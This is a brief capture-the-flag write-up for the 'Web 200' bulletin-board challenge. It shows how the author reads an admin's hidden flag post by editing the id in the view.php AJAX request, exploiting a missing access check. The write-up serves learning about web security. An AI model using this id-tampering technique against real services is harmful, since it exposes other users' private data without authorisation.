# Web 200

Web 200 is a sort of web bulletin board.

You can make an account, log in, post messages (which appear in
a large public list of all 'posts'), and view your own messages.

![Full Listing](web200/flag_listing.png)

It seems that there is an **admin** account with a **flag** post. It
turns out that the goal of the puzzle is to illegally read the post.

I made the user **apple**, and then made a post titled **sdfsdf**. The
contents of the post was also **sdfsdf**. I probably should have
made them different.


![Own Post's Listing](web200/own_listing.png)

As the picture shows, I can see other people's post titles and my own,
but I cannot see the contents. I can click View next to my own post to see the contents of my post.

![View Post](web200/view_post.png")

Upon inspection of my network tabs, it's clear that clicking View
creates an ajax request to retrieve the description data.

![Ajax Request](web200/ajax_request.png")

The source of the web page contains the following code:

    $.ajax({
        type: "POST",
        url: "view.php",
        data:"View=View&id="+id,
        success: function(msg) {
            alert(msg);
        }
    });

Mutate it to be that of the flag, and fire. With trial and error, It turns out that the flag's
id is 1, not 0.

    $.ajax({
        type: "POST",
        url: "view.php",
        data:"View=View&id="+1,
        success: function(msg) {
            alert(msg);
        }
    });
